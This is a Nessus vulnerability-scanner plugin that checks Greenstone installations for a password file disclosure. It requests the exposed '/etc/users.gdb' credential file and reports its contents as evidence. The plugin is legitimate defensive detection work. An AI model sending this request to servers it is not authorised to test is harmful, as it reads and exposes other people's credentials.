#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(66719);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/09/24 21:08:39 $");

  script_bugtraq_id(56662);
  script_osvdb_id(87844);

  script_name(english:"Greenstone Password File Disclosure");
  script_summary(english:"Checks for vulnerable installation of Greenstone.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a file disclosure
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Greenstone install listening on the remote host is affected by a
password file disclosure vulnerability in the 'cgi-bin/library.cgi'
script.  A remote attacker could exploit this issue with a specially
crafted request to perform a direct request to obtain the credential
files. 

There are, reportedly, other vulnerabilities in this version of
Greenstone, though Nessus has not checked for them.");
  # http://packetstormsecurity.com/files/118323/Greenstone-XSS-Password-Disclosure-Log-Forging.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ca0c3790");
  script_set_attribute(attribute:"see_also", value:"http://wiki.greenstone.org/wiki/index.php/3.05_Release_Notes#Security");
  script_set_attribute(attribute:"solution", value:"Upgrade to Greenstone 3.05 or later");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/11/23");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/11/23");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/05/31");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:greenstone:greenstone");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("greenstone_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/greenstone");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

appname = "Greenstone";

install = get_install_from_kb(appname:"greenstone", port:port, exit_on_fail:TRUE);
dir = install["dir"];
install_url = build_url(qs:dir + '/', port:port);

vuln_url = dir + "/etc/users.gdb";
res = http_send_recv3(
        port         : port,
        method       : "GET",
        item         : vuln_url,
        exit_on_fail : TRUE
      );
if (
  "<groups>" >< res[2] &&
  "<password>" >< res[2] &&
  "<username>" >< res[2]
)
{
  index = stridx(res, "<comment");
  if (index == -1) index = stridx(res, "<enabled");
  if (index == -1) index = stridx(res, "<groups");
  if (index == -1) index = 0;   # nb: this shouldn't be necessary.
  length = strlen(res);
  output = substr(res, index, length);
  if (report_verbosity > 0)
  {
    report =
        '\nNessus was able to verify the issue exists using the following request : ' +
        '\n' +
        '\n  ' + build_url(port:port, qs:vuln_url) +
        '\n';
    if (report_verbosity > 1)
    {

      report +=
        '\n' + 'This produced the following output :' +
        '\n' +
        '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) +
        '\n' + chomp(output) +
        '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, install_url);
